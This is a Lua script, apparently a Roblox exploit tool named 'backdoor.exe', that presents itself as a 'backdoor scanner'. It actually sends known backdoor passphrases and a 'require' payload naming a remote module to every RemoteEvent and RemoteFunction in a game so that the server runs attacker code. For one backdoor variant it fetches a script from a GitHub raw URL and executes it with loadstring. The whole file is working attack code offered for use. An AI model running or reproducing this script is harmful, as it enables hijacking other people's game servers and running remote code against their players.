--[[
    backdoor.exe, the best backdoor scanner in Roblox.
    Copyright (C) 2021	iK4oS

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
]]

local LocalPlayer = game:GetService("Players").LocalPlayer
local requireScript = ("require(7924358164):k4scripts('%s')"):format(LocalPlayer.Name)
local invCode = "6HndYgC"

local alternativeSS = {
	run = { [1] = "5#lGIERKWEF" },
	emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
	helpme = { [1] = "helpme" },
	pickett = { [1] = "cGlja2V0dA==" },
	harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/harkedSS.lua"
}

local function notify(text)
	game:GetService("StarterGui"):SetCore(
	"SendNotification",
		{
			Title = "backdoor.exe",
			Duration = 3,
			Text = text
		}
	)
end

local function attached(possibleWait)
	if possibleWait then wait(possibleWait) end
	return LocalPlayer.PlayerGui:FindFirstChild("backdoor.exe")
end

local function validRemote(rm, _className)
	local fullName =  rm:GetFullName()
	
	if string.find(fullName, "DefaultChat") then return false end
	if string.find(fullName, LocalPlayer.Name) then return false end
	if rm:FindFirstChild("__FUNCTION") then return false end
	if rm.Parent == game:GetService("JointsService") then return false end
	
	if rm.ClassName ~= _className then return false end

	if getgenv().blacklisted then
		if table.find(getgenv().blacklisted, fullName) then return false end
	end

	return true
end

local function harked()
	local backpack = LocalPlayer.Backpack 
	return backpack:FindFirstChild("HandlessSegway") and
		Backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
		Backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
end
local function emmaBackdoor(rm)
	return rm.Name == "emma" and rm.Parent.Name == "mynameemma"
end
local function runBackdoor(rm)
	return rm.Name == "Run" and
	rm.Parent:FindFirstChild("Pages") and rm.Parent:FindFirstChild("R6") and
	rm.Parent:FindFirstChild("Version") and rm.Parent:FindFirstChild("Title")
end

local function scanGame()
    notify("Scanning for a backdoor.")
	if harked() then
		loadstring(game:HttpGetAsync(alternativeSS.harked))()
		return
	end

	for _, remote in pairs(game:GetDescendants()) do
		if validRemote(remote, "RemoteEvent") and not attached() then
			if emmaBackdoor(remote) then
				remote:FireServer(unpack(alternativeSS.emma), requireScript)
			end
			if runBackdoor(remote) then
				remote:FireServer(unpack(alternativeSS.run), requireScript)
			end

			remote:FireServer(unpack(alternativeSS.helpme), requireScript)
			remote:FireServer(unpack(alternativeSS.pickett), requireScript)
			remote:FireServer(requireScript)

		end
	end

	for _, remote in pairs(game:GetDescendants()) do
		if validRemote(remote, "RemoteFunction") and not attached() then
			remote:InvokeServer(requireScript)
		end
	end

end

local function Main()
	notify("Make sure to join our Discord!\nCode: "..invCode)

	scanGame()
	
	if not attached(2) then
		notify("Unable to find backdoor.\nGame not backdoored?")
	end
end

if game:IsLoaded() then
	pcall(Main)
end

--	k4scripts
--	.------.
--	|4.--. |
--	| :│/: |
--	| :│\: |
--	| '--'4|
--	`------'
